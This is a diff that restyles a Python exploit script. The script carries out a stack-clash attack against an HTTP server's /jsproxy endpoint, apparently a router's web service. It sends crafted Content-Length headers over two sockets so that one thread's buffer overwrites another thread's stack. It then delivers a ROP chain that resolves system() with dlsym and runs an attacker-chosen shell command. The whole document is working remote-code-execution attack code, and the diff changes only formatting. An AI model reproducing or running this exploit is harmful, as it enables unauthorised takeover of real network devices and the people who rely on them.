@@ -7,16 +7,28 @@
 # ASLR enabled on libs only
 # DEP enabled
 
-import socket, time, sys, struct
-from pwn import *
+import socket
+import struct
+import sys
+import time
+
+from pwn import (
+    context,
+    ROP,
+    ELF,
+)
+from pwn import *  # noqa
 import ropgadget
 
-AST_STACKSIZE = 0x20000 # stack size per thread (128 KB)
-SKIP_SPACE    =  0x1000 # 4 KB of "safe" space for the stack of thread 2
-ROP_SPACE     =  0x8000 # we can send 32 KB of ROP chain!
+AST_STACKSIZE = 0x20000  # stack size per thread (128 KB)
+SKIP_SPACE = 0x1000  # 4 KB of "safe" space for the stack of thread 2
+ROP_SPACE = 0x8000  # we can send 32 KB of ROP chain!
 
-ALIGN_SIZE    = 0x10 # alloca align memory with "content-length + 0x10 & 0xF" so we need to take it into account
-ADDRESS_SIZE  =  0x4 # we need to overwrite a return address to start the ROP chain
+# alloca align memory with "content-length + 0x10 & 0xF" so we need to take it into account
+ALIGN_SIZE = 0x10
+
+# we need to overwrite a return address to start the ROP chain
+ADDRESS_SIZE = 0x4
 
 context(arch="i386", os="linux", log_level="WARNING")
 
@@ -26,8 +38,10 @@ strings = dict()
 system_chunks = []
 cmd_chunks = []
 
+
 def makeHeader(num):
     return bytes("POST /jsproxy HTTP/1.1\r\nContent-Length: ") + bytes(str(num)) + bytes("\r\n\r\n")
+
 
 def makeSocket(ip, port):
     s = socket.socket()
@@ -40,6 +54,7 @@ def makeSocket(ip, port):
     time.sleep(0.5)
     return s
 
+
 def socketSend(s, data):
     try:
         s.send(data)
@@ -48,6 +63,7 @@ def socketSend(s, data):
         sys.exit(-1)
     print("Sent")
     time.sleep(0.5)
+
 
 def ropCall(function_address, *arguments):
 
@@ -75,6 +91,7 @@ def ropCall(function_address, *arguments):
 
     return payload
 
+
 # pwntools filters out JOP gadgets
 # https://github.com/Gallopsled/pwntools/blob/5d537a6189be5131e63144e20556302606c5895e/pwnlib/rop/rop.py#L1074
 def ropSearchJmp(elf, instruction):
@@ -94,13 +111,14 @@ def ropSearchJmp(elf, instruction):
 
     raise
 
+
 def loadOffsets(binary, shellCmd):
     elf = ELF(binary)
     rop = ROP(elf)
 
     # www PLT symbols
     plt["strncpy"] = elf.plt['strncpy']
-    plt["dlsym"]   = elf.plt['dlsym']
+    plt["dlsym"] = elf.plt['dlsym']
 
     # Gadgets to clean the stack from arguments
     gadgets['pppp'] = rop.search(regs=["ebx", "esi", "edi", "ebp"]).address
@@ -118,7 +136,8 @@ def loadOffsets(binary, shellCmd):
     writable_address = elf.writable_segments[0].header.p_paddr
 
     strings['system'] = writable_address
-    strings['cmd']    = writable_address + 0xf
+    strings['cmd'] = writable_address + 0xf
+
 
 def generateStrncpyChain(dst, chunks):
     chain = ""
@@ -128,6 +147,7 @@ def generateStrncpyChain(dst, chunks):
         offset += length
 
     return chain
+
 
 # only search for single chars
 def searchStringChunksLazy(elf, string):
@@ -143,6 +163,7 @@ def searchStringChunksLazy(elf, string):
         raise
 
     return chunks
+
 
 # [bugged, some problem with dots, not used]
 # search chunks of string
@@ -163,7 +184,7 @@ def searchStringChunks(elf, string):
             string = string[len(looking):]
             looking = string
         else:   # search failed
-            looking = looking[:-1] # search again removing last char
+            looking = looking[:-1]  # search again removing last char
 
     check_length = 0
     for (address, length) in chunks:
@@ -174,19 +195,21 @@ def searchStringChunks(elf, string):
     else:
         raise
 
+
 def buildROP(binary, shellCmd):
     loadOffsets(binary, shellCmd)
 
     # ROP chain
-    exploit  = generateStrncpyChain(strings['system'], system_chunks) # w_segment = "system"
+    exploit = generateStrncpyChain(strings['system'], system_chunks)  # w_segment = "system"
     exploit += generateStrncpyChain(strings['cmd'], cmd_chunks)       # w_segment = "bash cmd"
-    exploit += ropCall(plt["dlsym"], 0, strings['system']) # dlsym(0, "system"), eax = libc.system
-    exploit += ropCall(gadgets['jeax'], strings['cmd'])    # system("cmd")
+    exploit += ropCall(plt["dlsym"], 0, strings['system'])  # dlsym(0, "system"), eax = libc.system
+    exploit += ropCall(gadgets['jeax'], strings['cmd'])     # system("cmd")
 
     # The server is automatically restarted after 3 secs, so we make it crash with a random address
     exploit += struct.pack('<L', 0x13371337)
 
     return exploit
+
 
 def stackClash(ip, port, ropChain):
 
@@ -194,43 +217,53 @@ def stackClash(ip, port, ropChain):
 
     # 1) Start 2 threads
     # open 2 socket so 2 threads are created
-    s1 = makeSocket(ip, port) # socket 1, thread A
-    s2 = makeSocket(ip, port) # socket 2, thread B
+    s1 = makeSocket(ip, port)  # socket 1, thread A
+    s2 = makeSocket(ip, port)  # socket 2, thread B
 
     print("Stack clash...")
 
     # 2) Stack Clash
     # 2.1) send post header with Content-Length bigger than AST_STACKSIZE to socket 1 (thread A)
-    socketSend(s1, makeHeader(AST_STACKSIZE + SKIP_SPACE + ROP_SPACE)) # thanks to alloca, the Stack Pointer of thread A will point inside the stack frame of thread B (the post_data buffer will start from here)
+    # thanks to alloca, the Stack Pointer of thread A will point inside the stack frame
+    # of thread B (the post_data buffer will start from here)
+    socketSend(s1, makeHeader(AST_STACKSIZE + SKIP_SPACE + ROP_SPACE))
 
     # 2.2) send some bytes as post data to socket 1 (thread A)
-    socketSend(s1, b'A'*(SKIP_SPACE - ALIGN_SIZE - ADDRESS_SIZE)) # increase the post_data buffer pointer of thread A to a position where a return address of thread B will be saved
+    # increase the post_data buffer pointer of thread A to a position
+    # where a return address of thread B will be saved
+    socketSend(s1, b'A'*(SKIP_SPACE - ALIGN_SIZE - ADDRESS_SIZE))
 
     # 2.3) send post header with Content-Length to reserve ROP space to socket 2 (thread B)
-    socketSend(s2, makeHeader(ROP_SPACE)) # thanks to alloca, the Stack Pointer of thread B will point where post_data buffer pointer of thread A is positioned
+    # thanks to alloca, the Stack Pointer of thread B will point where post_data buffer pointer
+    # of thread A is positioned
+    socketSend(s2, makeHeader(ROP_SPACE))
 
     print("Sending payload")
 
     # 3) Send ROP chain
-    socketSend(s1, ropChain) # thread A writes the ROP chain in the stack of thread B
+    socketSend(s1, ropChain)  # thread A writes the ROP chain in the stack of thread B
 
     print("Starting exploit")
 
     # 4) Start ROP chain
-    s2.close() # close socket 2 to return from the function of thread B and start ROP chain
+    s2.close()  # close socket 2 to return from the function of thread B and start ROP chain
 
     print("Done!")
 
+
 if __name__ == "__main__":
     if len(sys.argv) == 5:
-        ip       = sys.argv[1]
-        port     = int(sys.argv[2])
-        binary   = sys.argv[3]
+        ip = sys.argv[1]
+        port = int(sys.argv[2])
+        binary = sys.argv[3]
         shellCmd = sys.argv[4]
 
         print("Building ROP chain...")
         ropChain = buildROP(binary, shellCmd)
-        print("The ROP chain is " + str(len(ropChain)) + " bytes long (" + str(ROP_SPACE) + " bytes available)")
+        print(
+            "The ROP chain is %s bytes long (%s bytes available)"
+            % (len(ropChain), ROP_SPACE)
+        )
 
         stackClash(ip, port, ropChain)
     else:
